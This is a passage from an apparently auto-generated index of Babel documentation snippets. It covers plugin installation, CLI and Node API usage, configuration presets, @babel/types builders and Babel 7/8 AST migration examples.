https://github.com/babel/website/blob/main/docs/plugin-proposal-explicit-resource-management.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-explicit-resource-management\n```\n\n----------------------------------------\n\nTITLE: Install Babel packages using npm\nDESCRIPTION: This shell command uses npm to install the @babel/core and @babel/node packages as development dependencies.  The --save-dev flag ensures that these packages are added to the devDependencies section of the package.json file. These are common Babel dependencies needed for transpiling and running code using Babel.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/nodemon/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install @babel/core @babel/node --save-dev\n```\n\n----------------------------------------\n\nTITLE: Babel 6 Preset Configuration JSON\nDESCRIPTION: Demonstrates a basic Babel 6 configuration file using presets. It configures Babel to use the 'env', 'react', and 'stage-2' presets to transform code according to specified environments and ECMAScript stages.\nSOURCE: https://github.com/babel/website/blob/main/docs/faq.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"env\", \"react\", \"stage-2\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TSEnumMember Node in JavaScript\nDESCRIPTION: This code creates a `TSEnumMember` AST node using the `t.tsEnumMember` builder function. It takes an identifier or string literal and an optional initializer expression. This node represents a member within a TypeScript enum.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_171\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsEnumMember(id, initializer);\n```\n\n----------------------------------------\n\nTITLE: Multiple Imports JavaScript\nDESCRIPTION: This Javascript snippet shows multiple imports with the same basename.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport fooBar1 from \"foo-bar\";\nimport fooBar2 from \"./mylib/foo-bar\";\n```\n\n----------------------------------------\n\nTITLE: ImportDeclaration AST Example JavaScript\nDESCRIPTION: Shows the Abstract Syntax Tree (AST) structure for an `ImportDeclaration` node, including the `specifiers`, `source`, and `attributes` properties. The `attributes` array contains an `ImportAttribute` node with the key and value of the attribute.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2025-03-24-7.27.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nImportDeclaration {\n  specifiers: [],\n  source: StringLiteral(\"./data.json\"),\n  attributes: [\n    ImportAttribute { key: Identifier(\"type\"), value: StringLiteral(\"json\") }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Async/Await Pipeline Desugaring (Initial)\nDESCRIPTION: This JavaScript snippet shows the initial proposed syntax for using `await` within a pipeline.  It illustrates the desugaring to `await f(x)`, highlighting a potential point of contention with alternative interpretations.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nx |> await f\n```\n\n----------------------------------------\n\nTITLE: Babel Polyfill Usage: Output\nDESCRIPTION: This shows the transformed code after Babel applies the polyfills.  Instead of importing the entire library, it selectively imports the necessary core-js modules to support the used features, reducing the bundle size.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es7.string.pad-start\";\nimport \"core-js/modules/es7.string.pad-end\";\n```\n\n----------------------------------------\n\nTITLE: Minifying JavaScript with Node API\nDESCRIPTION: This snippet demonstrates how to use the babel-minify Node API to minify JavaScript code. It imports the `babel-minify` module, calls the minify function with input code and options, and retrieves the minified code and sourcemap.\nSOURCE: https://github.com/babel/website/blob/main/docs/minify.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst minify = require(\"babel-minify\");\n\nconst { code, map } = minify(\"input code\", {\n  mangle: {\n    keepClassName: true,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Usage via Node API - JavaScript\nDESCRIPTION: This code snippet shows how to use the Babel Node API to transform JavaScript code with the @babel/plugin-transform-duplicate-keys plugin. It transforms duplicate keys in object literals into computed properties. Requires @babel/core to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-keys.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-duplicate-keys\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Babelify with Options via Node API (JavaScript)\nDESCRIPTION: This code snippet demonstrates how to configure Babelify with specific options, such as disabling comments, directly within the Browserify Node API. The `babelify.configure` function is used to apply the configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browserify/usage.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nbrowserify().transform(babelify.configure({\n  comments: false\n}))\n```\n\n----------------------------------------\n\nTITLE: Configuring specific options in babel.config.json\nDESCRIPTION: This JSON configuration demonstrates how to set specific options for the 'minify' preset. Here, the `evaluate` option is set to `false`, and `mangle` is set to `true`, overriding the default behavior of these plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [[\"minify\", {\n    \"evaluate\": false,\n    \"mangle\": true\n  }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Automatic Polyfilling with Array Includes\nDESCRIPTION: This JavaScript code demonstrates how Babel, with the `useBuiltIns: \"usage\"` option, might inject polyfill imports.  It may infer the need for an array polyfill based on the `.includes` method call.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es7.array.includes\";\na.includes // assume a is an []\n```\n\n----------------------------------------\n\nTITLE: Excluding names from mangling in babel.config.json\nDESCRIPTION: This JSON configuration shows how to exclude specific names from being mangled during the minification process. The `mangle.exclude` option is used to prevent 'ParserError' and 'NetworkError' from being renamed.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [[\"minify\", {\n    \"mangle\": {\n      \"exclude\": [\"ParserError\", \"NetworkError\"]\n    }\n  }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Add Default Import with Hint JavaScript\nDESCRIPTION: Adds a default import statement with a name hint. Requires @babel/helper-module-imports. If 'hintedName' exists in scope, the name will be '_hintedName2', '_hintedName3', ...\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addDefault } from \"@babel/helper-module-imports\";\n// If 'hintedName' exists in scope, the name will be '_hintedName2', '_hintedName3', ...\naddDefault(path, 'source', { nameHint: \"hintedName\" })\n```\n\n----------------------------------------\n\nTITLE: Avoiding impure template literals repetition in **= (JavaScript)\nDESCRIPTION: This snippet prevents the repetition of impure (template) literals when desugaring the exponentiation assignment operator (**=). It optimizes the code generation to avoid evaluating the template literal multiple times.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\na[`${b++}`] **= 1;\n```\n\n----------------------------------------\n\nTITLE: JavaScript Class Transformation with noClassCalls Assumption\nDESCRIPTION: Illustrates how Babel transforms a JavaScript class when the `noClassCalls` assumption is enabled. The transformation omits the `_classCallCheck` function, resulting in smaller output. This requires the `noClassCalls` assumption to be enabled in the Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet Test = function Test() {\n  this.x = 2;\n};\n\n// Won't throw since we violated the assumption\nTest();\n```\n\n----------------------------------------\n\nTITLE: Duplicate Keys Transformation - JavaScript\nDESCRIPTION: This example demonstrates how the plugin transforms object literals with duplicate keys into objects with computed properties. The plugin converts the duplicate keys to computed properties so that it can be handled by the transform-computed-properties plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-keys.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar x = { a: 5, a: 6 };\nvar y = {\n  get a() {},\n  set a(x) {},\n  a: 3,\n};\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar x = { a: 5, [\"a\"]: 6 };\nvar y = {\n  get a() {},\n  set a(x) {},\n  [\"a\"]: 3,\n};\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via Node API\nDESCRIPTION: Transforms JavaScript code using the Babel Node API with the @babel/plugin-syntax-object-rest-spread plugin enabled. This allows Babel to parse object rest and spread syntax when transforming code programmatically. It requires the @babel/core package.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-object-rest-spread.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-object-rest-spread\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage\nDESCRIPTION: This JSON snippet shows how to configure the Babel plugin within a `babel.config.json` file. By including `minify-guarded-expressions` in the `plugins` array, Babel will use the plugin during the transformation process. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-guarded-expressions.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-guarded-expressions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript with bugfixes enabled\nDESCRIPTION: Illustrates how Babel transforms JavaScript code with function parameters when targeting Edge 16, but with the `bugfixes` option enabled. It demonstrates that only the broken syntax is transformed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = ({ a = 1 }, b = 2, ...args) => [a, b, args];\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = ({ a: a = 1 }, b = 2, ...args) => [a, b, args];\n```\n\n----------------------------------------\n\nTITLE: Creating Logical Expression in JavaScript\nDESCRIPTION: This snippet demonstrates creating a `LogicalExpression` AST node using Babel's `t.logicalExpression` builder.  It takes an `operator` (string, either \"||\", \"&&\", or \"??\"), `left` (Expression), and `right` (Expression) as arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_109\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.logicalExpression(operator, left, right);\n```\n\n----------------------------------------\n\nTITLE: Path Replacement with New Paths Array\nDESCRIPTION: This code snippet shows how the `Path#replaceWith` API now returns an array of new paths in Babel 7. It exemplifies the use of the returned array to access the replaced node's `Path` object.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst node = t.nullLiteral();\nconst [replaced] = path.replaceWith(node);\nreplace.node === node; // => true\n```\n\n----------------------------------------\n\nTITLE: Using TSTypeQuery (TS)\nDESCRIPTION: Illustrates the AST for TSTypeQuery in Babel 7 and Babel 8.  The `typeParameters` property is renamed to `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_49\n\nLANGUAGE: typescript\nCODE:\n```\nvar arr: typeof Array<string>;\n\n// AST in Babel 7\n{\n  type: \"TSTypeQuery\",\n  exprName: Identifier(\"Array\"),\n  typeParameters: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n\n// AST in Babel 8\n{\n  type: \"TSTypeQuery\",\n  exprName: Identifier(\"Array\"),\n  typeArguments: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: NewExpression TypeParameters Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `typeParameters` to `typeArguments` in NewExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_32\n\nLANGUAGE: typescript\nCODE:\n```\nnew Component<string>()\n```\n\n----------------------------------------\n\nTITLE: Checking for ModuleSpecifier Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a module specifier (import or export). It uses the `t.isModuleSpecifier(node)` method from Babel's `types` API. It covers nodes like `ExportDefaultSpecifier`, `ExportNamespaceSpecifier`, `ExportSpecifier`, `ImportDefaultSpecifier`, `ImportNamespaceSpecifier`, and `ImportSpecifier`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_284\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isModuleSpecifier(node);\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Await example in current JavaScript\nDESCRIPTION: This snippet shows standard JavaScript code with awaits, used as a comparison for the F# and Smart pipeline examples.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet id = (\n  await (\n    await fetch(url)\n  ).json()\n).ID;\n\n```\n\n----------------------------------------\n\nTITLE: Checking for Standardized Nodes in JavaScript\nDESCRIPTION: This snippet uses `t.isStandardized(node)` to verify if an AST node is part of an official ECMAScript specification. It covers a wide range of expression, statement, and declaration nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_292\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isStandardized(node);\n```\n\n----------------------------------------\n\nTITLE: Usage via CLI - Shell\nDESCRIPTION: This command line instruction demonstrates how to use the Babel CLI to transform a JavaScript file (script.js) using the @babel/plugin-transform-duplicate-keys plugin. It transforms duplicate keys in object literals into computed properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-keys.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-duplicate-keys script.js\n```\n\n----------------------------------------\n\nTITLE: Install Babel Preset Flow Shell\nDESCRIPTION: This command installs the @babel/preset-flow package as a development dependency using npm. This allows you to use the preset in your Babel configuration to strip Flow types.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-flow\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: This command demonstrates how to use the `babel-plugin-transform-remove-undefined` plugin via the Babel CLI.  It transforms `script.js` using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-undefined.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins babel-plugin-transform-remove-undefined script.js\n```\n\n----------------------------------------\n\nTITLE: Declaring splitExportDeclaration Function JavaScript\nDESCRIPTION: This code snippet declares the `splitExportDeclaration` function, indicating that it accepts a NodePath as an argument. This declaration specifies the expected signature of the helper function.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-split-export-declaration.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ndeclare export default splitExportDeclaration(path: NodePath);\n```\n\n----------------------------------------\n\nTITLE: Retaining method return types on Classes (JavaScript)\nDESCRIPTION: This snippet illustrates how method return types are retained on transform-es2015-classes. It fixes an issue where flow type annotations were being lost during the class transformation process.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_22\n\nLANGUAGE: JavaScript\nCODE:\n```\n// @flow\nclass C {\n  m(x: number): string {\n    return 'a';\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an EnumBooleanBody AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.enumBooleanBody` to create an enum boolean body node in the AST for Flow. It takes an array of EnumBooleanMember nodes, a boolean indicating whether the type is explicit, and a boolean indicating whether there are unknown members.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_51\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumBooleanBody(members);\n```\n\n----------------------------------------\n\nTITLE: Renaming JSXIdentifier in @babel/types\nDESCRIPTION: This code snippet illustrates the change in casing for JSX and TS node builders in `@babel/types`. It shows the transition from uppercase prefixes (e.g., `jSXIdentifier`) to lowercase prefixes (e.g., `jsxIdentifier`).\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n- t.jSXIdentifier()\n+ t.jsxIdentifier()\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via CLI\nDESCRIPTION: Shows how to use the @babel/plugin-syntax-nullish-coalescing-operator plugin via the Babel CLI. This command-line invocation enables Babel to process a script file, parsing the nullish coalescing operator syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-nullish-coalescing-operator.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-nullish-coalescing-operator script.js\n```\n\n----------------------------------------\n\nTITLE: Updating devDependencies with Babel 7.0 beta\nDESCRIPTION: This code snippet shows how to update the `babel-cli` dependency in your `package.json` file to the 7.0.0-beta.0 version. This is the first step to upgrading your project to use Babel 7.0.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"devDependencies\": {\n    \"babel-cli\": \"7.0.0-beta.0\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Async Do Expressions Plugin via Node API\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the @babel/plugin-syntax-async-do-expressions plugin with the Babel Node API. The transformSync function parses the input 'code' string using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-do-expressions.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-async-do-expressions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Checking for TSTypeElement Nodes in JavaScript\nDESCRIPTION: This snippet shows how to check if an AST node is a TypeScript type element using Babel's `t.isTSTypeElement` method. This can be used to identify type declarations within TypeScript code, such as call signatures, construct signatures, index signatures, method signatures, and property signatures. This function returns `true` if the node is a type element and `false` otherwise.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_297\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isTSTypeElement(node);\n```\n\n----------------------------------------\n\nTITLE: Finding all super() calls (TS)\nDESCRIPTION: This code snippet, taken from `@babel/helper-create-class-features-plugin`, demonstrates how to find all `super()` calls within a class using `traverse.visitors.merge` and `environmentVisitor`. It pushes the parent `CallExpression` path to an array if the current `Super` node is the callee of that expression. `environmentVisitor` ensures correct context.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_9\n\nLANGUAGE: typescript\nCODE:\n```\nconst findBareSupers = traverse.visitors.merge<NodePath<t.CallExpression>[]>([\n  {\n    Super(path) {\n      const { node, parentPath } = path;\n      if (parentPath.isCallExpression({ callee: node })) {\n        this.push(parentPath);\n      }\n    },\n  },\n  environmentVisitor,\n]);\n```\n\n----------------------------------------\n\nTITLE: Use babel-plugin-minify-simplify via CLI - Shell\nDESCRIPTION: This command demonstrates how to use the `minify-simplify` plugin via the Babel CLI. It runs Babel on `script.js` and applies the plugin during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-simplify.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-simplify script.js\n```\n\n----------------------------------------\n\nTITLE: CLI Usage - Shell\nDESCRIPTION: This snippet shows how to use the @babel/plugin-proposal-destructuring-private plugin via the Babel CLI.  It uses the --plugins option to specify the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-destructuring-private.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-destructuring-private script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Transforms JavaScript code using the Babel Node API, specifying the @babel/plugin-syntax-function-bind plugin.  Requires @babel/core.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-bind.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-function-bind\"]\n});\n```\n\n----------------------------------------\n\nTITLE: ES5 Autobinding with React.createClass\nDESCRIPTION: Illustrates how React.createClass automatically binds methods to the component instance in ES5.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n// Autobinding, brought to you by React.createClass\nvar PostInfo = React.createClass({\n  handleOptionsButtonClick: function(e) {\n    // Here, 'this' refers to the component instance.\n    this.setState({showOptionsModal: true});\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Class Properties (JavaScript)\nDESCRIPTION: This snippet shows the default Babel 7 behavior for class properties. The `Object.defineProperty` is used to define the properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\n// input\nclass Bork {\n  static a = \"foo\";\n  y;\n}\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// v7 default behavior: [\"@babel/plugin-proposal-class-properties\"]\nvar Bork = function Bork() {\n  Object.defineProperty(this, \"y\", {\n    enumerable: true,\n    writable: true,\n    value: void 0,\n  });\n};\n\nObject.defineProperty(Bork, \"a\", {\n  enumerable: true,\n  writable: true,\n  value: \"foo\",\n});\n```\n\n----------------------------------------\n\nTITLE: Checking for Base TypeScript Types in JavaScript\nDESCRIPTION: This snippet demonstrates using `t.isTSBaseType(node)` to identify primary TypeScript type annotations. It covers keywords like `TSAnyKeyword`, `TSStringKeyword`, etc.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_294\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isTSBaseType(node);\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining Assignment in Babel 8\nDESCRIPTION: Demonstrates optional chaining assignment in Babel 8. It prevents errors when trying to access or assign to properties on potentially null or undefined values.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_15\n\nLANGUAGE: javascript\nCODE:\n```\nx?.prop = 2\n```\n\n----------------------------------------\n\nTITLE: Regenerator Runtime Helper Code Diff\nDESCRIPTION: This code snippet shows the diff between old and new Babel versions when compiling a generator function. It highlights that, in Babel 7.18.0, `regenerator-runtime` is inlined, eliminating the need for a global `regeneratorRuntime` variable.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-05-19-7.18.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n+function _regeneratorRuntime() { /* ... */ }\n\n-var f = /*#__PURE__*/regeneratorRuntime.mark(function f() {\n+var f = /*#__PURE__*/_regeneratorRuntime().mark(function f() {\n-  return regeneratorRuntime.wrap(function f$(_context) {\n+  return _regeneratorRuntime().wrap(function f$(_context) {\n     while (1) {\n       switch (_context.prev = _context.next) {\n         case 0:\n         case \"end\":\n           return _context.stop();\n       }\n     }\n   }, f);\n });\n```\n\n----------------------------------------\n\nTITLE: Package.json DevDependencies Example\nDESCRIPTION: Shows the expected entries in the `devDependencies` section of `package.json` after successfully installing `@babel/cli` and `@babel/core`. These dependencies specify the Babel CLI and core versions used by the project.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"devDependencies\": {\n+   \"@babel/cli\": \"^7.0.0\",\n+   \"@babel/core\": \"^7.0.0\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming RegExp Intersection (JavaScript)\nDESCRIPTION: This example demonstrates how the plugin transforms a regular expression with intersection of ASCII and Decimal_Number Unicode properties using the `v` flag into a `u` flag regular expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n/[\\p{ASCII}&&\\p{Decimal_Number}]/v;\n```\n\nLANGUAGE: javascript\nCODE:\n```\n/[0-9]/u;\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript code shows how to use the transform-merge-sibling-variables plugin with the Babel Node API. It transforms the input code string using the transformSync method with the specified plugin in the options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-merge-sibling-variables.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-merge-sibling-variables\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Remove Undefined Returns Example (In)\nDESCRIPTION: This example demonstrates the input JavaScript code before the `babel-plugin-transform-remove-undefined` plugin is applied. It shows a function `foo` that explicitly returns `undefined` and a variable `a` initialized to `void 0`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-undefined.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet a = void 0;\nfunction foo() {\n  var b = undefined;\n  return undefined;\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin/Preset Definition\nDESCRIPTION: This code snippet showcases the structure of a Babel plugin or preset definition in Babel 7. It shows the function signature, which includes the `api` object, plugin/preset options, and the `dirname` for resolving relative paths.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = function(api, options, dirname) {};\n```\n\n----------------------------------------\n\nTITLE: Creating ExpressionStatement in JavaScript\nDESCRIPTION: This snippet shows how to create an `ExpressionStatement` AST node using Babel's `t.expressionStatement` method. The `expression` parameter is required and must be an `Expression` node. This node represents a statement that consists of a single expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_67\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.expressionStatement(expression);\n```\n\n----------------------------------------\n\nTITLE: Extend Program Interface with Interpreter Directive\nDESCRIPTION: This code snippet presents the extension of the `Program` interface to include an `interpreter` field of type `InterpreterDirective`. This change introduces a dedicated node for shebangs in the AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nextend interface Program {\n  interpreter: InterpreterDirective;\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Optional Chaining JavaScript\nDESCRIPTION: This plugin transforms the optional chaining operator (`?.`) to handle properties of deeply nested objects without worrying about undefined intermediate objects. It allows safe access to potentially null or undefined properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\na?.b = 42;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _a;\n(_a = a) == null ? void 0 : _a.b = 42;\n```\n\n----------------------------------------\n\nTITLE: Top-Level Await Support in Babel\nDESCRIPTION: This snippet illustrates the use of top-level await, allowing `await` expressions outside of async functions in modules. It simplifies asynchronous module initialization. Requires Babel to be configured to support the top-level await proposal.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport db from \"./database.js\";\n\nawait db.connect();\n```\n\n----------------------------------------\n\nTITLE: Checking for ForStatement Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a `ForStatement` or `ForXStatement`. It uses the `t.isFor(node)` method from Babel's `types` API. This method is used to identify `ForInStatement`, `ForOfStatement`, and `ForStatement` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_271\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFor(node);\n```\n\n----------------------------------------\n\nTITLE: Transforming a File Asynchronously (Promise Example)\nDESCRIPTION: Shows how to use `babel.transformFileAsync` to transform a file and access the transformed code from the resolved Promise. The function takes the filename and options and returns the transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformFileAsync(\"filename.js\", options).then(result => {\n  result.code;\n});\n```\n\n----------------------------------------\n\nTITLE: Transform Sticky Regex Example\nDESCRIPTION: Transforms JavaScript code containing sticky regex literals to use the RegExp constructor, making it compatible with older JavaScript environments. The input code defines a sticky regex, and the output code creates an equivalent regex using the RegExp constructor.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-sticky-regex.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst a = /o+/y;\n```\n\n----------------------------------------\n\nTITLE: NewExpression AST (Babel 7)\nDESCRIPTION: Babel 7 AST for NewExpression, using `typeParameters`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_33\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"NewExpression\",\n  \"callee\": Identifier(\"Component\"),\n  \"arguments\": [],\n  \"typeParameters\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/plugin-syntax-bigint\nDESCRIPTION: Installs the @babel/plugin-syntax-bigint plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-bigint.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-bigint\n```\n\n----------------------------------------\n\nTITLE: Configuring a Stage Preset in .babelrc\nDESCRIPTION: Shows how to configure a stage preset (e.g., `stage-2`) in the `.babelrc` configuration file. Stage presets automatically include all stages above them (e.g., stage-2 